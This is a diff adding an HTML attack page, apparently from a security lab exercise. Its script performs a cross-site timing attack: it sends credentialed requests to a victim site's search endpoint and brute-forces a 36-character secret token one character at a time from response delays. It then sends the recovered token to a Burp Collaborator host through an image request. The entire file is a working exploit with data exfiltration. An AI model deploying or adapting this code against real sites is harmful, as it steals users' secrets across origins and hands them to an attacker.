@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+    <ul id="secrets"></ul>
+
+<script>
+    
+    function nextChar(key)
+    {
+        chars="0123456789-abcdef"
+        for (var i = 0; i < chars.length; i++) {
+            char = chars.charAt(i)
+            const request = async (tk) => {
+                tk = key+char
+                let before = performance.now()
+                await fetch("http://ptl-ff8dcea2-d4247c35.libcurl.so/search?search=^"+tk, {
+                    credentials: 'include'
+                }).catch(e => console.log("BB"+e));
+                let request_time = performance.now() - before
+                console.log("tk:"+tk+":"+request_time)
+                if (request_time > 2500) {
+                    if (tk.length == 36) {
+                        sendKey(tk)
+                    } else {
+                        nextChar(tk)
+                    }
+                }
+            }
+            request(key+char)
+        }
+    }
+
+    nextChar("")
+
+
+    function sendKey(k)
+    {
+        console.log("sendKey:"+k)
+        var ul= document.getElementById("secrets");
+        var li = document.createElement("img");
+        li.src = "http://o4t4sbqxctrencjqc7upwwmkibo1cq.burpcollaborator.net?key="+k
+        ul.appendChild(li);
+    };
+    
+</script>
+  </body>
+</html>
